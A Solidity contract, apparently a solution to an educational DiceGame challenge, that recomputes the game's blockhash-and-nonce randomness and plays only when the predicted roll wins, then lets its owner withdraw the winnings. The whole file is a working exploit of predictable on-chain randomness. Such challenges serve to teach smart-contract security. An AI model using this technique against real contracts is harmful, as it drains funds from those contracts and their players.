// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Minimal interface to talk to the DiceGame challenge contract
interface IDiceGame {
  function rollTheDice() external payable;
  function nonce() external view returns (uint256);
}

contract RiggedRoll {
  IDiceGame public immutable diceGame;
  address public owner;

  uint256 public constant COST = 0.002 ether;

  modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
  }

  constructor(address _diceGame, address _owner) {
    require(_diceGame != address(0), "diceGame=0");
    require(_owner != address(0), "owner=0");
    diceGame = IDiceGame(_diceGame);
    owner = _owner;
  }

  /// @notice Allows this contract to receive ETH (from faucet / wallet)
  receive() external payable {}

  /// @notice Predict the next roll exactly like DiceGame does, and tell if it's a winner.
  function predictedRoll() public view returns (uint256 roll, bool willWin) {
    bytes32 prevHash = blockhash(block.number - 1);

    // IMPORTANT:
    // DiceGame uses its own address(this) + nonce internally,
    // so we must use address(diceGame) and the same nonce.
    bytes32 h = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
    roll = uint256(h) % 16;
    willWin = (roll <= 5);
  }

  /// @notice Only roll when guaranteed to win (0-5). Sends the required COST.
  function riggedRoll() external {
    require(address(this).balance >= COST, "Insufficient balance");

    (uint256 roll, bool willWin) = predictedRoll();
    require(willWin, "Not a winning roll");

    // must send >= 0.002 ETH or DiceGame reverts
    diceGame.rollTheDice{ value: COST }();

    // optional: you can emit logs if you want, but not needed
    // (keeping minimal for compatibility)
    roll; // silence unused var warning if any tool complains
  }

  /// @notice Withdraw ETH winnings to an address (locked to owner).
  function withdraw(address payable _to, uint256 _amount) external onlyOwner {
    require(_to != address(0), "to=0");
    require(address(this).balance >= _amount, "Too much");
    (bool ok, ) = _to.call{ value: _amount }("");
    require(ok, "Withdraw failed");
  }

  /// @notice (Optional) transfer ownership if you want.
  function setOwner(address _newOwner) external onlyOwner {
    require(_newOwner != address(0), "newOwner=0");
    owner = _newOwner;
  }
}

